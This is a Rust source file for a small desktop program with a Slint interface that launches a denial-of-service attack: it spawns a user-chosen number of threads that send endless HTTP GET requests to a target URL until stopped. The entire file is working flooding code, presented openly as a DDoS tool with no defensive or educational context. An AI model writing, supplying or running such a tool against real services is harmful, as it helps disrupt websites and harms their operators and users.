slint::include_modules!();

use std::thread::spawn;

static mut STOP_THREADS: bool = false;

fn ddos(target: String) {
    loop {
        unsafe { match STOP_THREADS {
            true => return,
            false => {},
        }}

        let _ = reqwest::blocking::get(target.clone()); 
    }
}

fn main() -> Result<(), slint::PlatformError> {
    let ui = MainWindow::new().unwrap();
    let ui_handle = ui.as_weak();

    ui.on_start_ddos(move || {
        let ui = ui_handle.unwrap();
        let not_running = ui.get_running();
        ui.set_running(!not_running);
        unsafe { STOP_THREADS = not_running; }

        if not_running {return}

        let target: String = ui.get_target().to_string();
        println!("Starting DDoS: {:?}", target);
        
        for _ in 0..ui.get_threads() {
            let tmp = target.clone();
            spawn(move || ddos(tmp));
        }
    });

    ui.run()
}

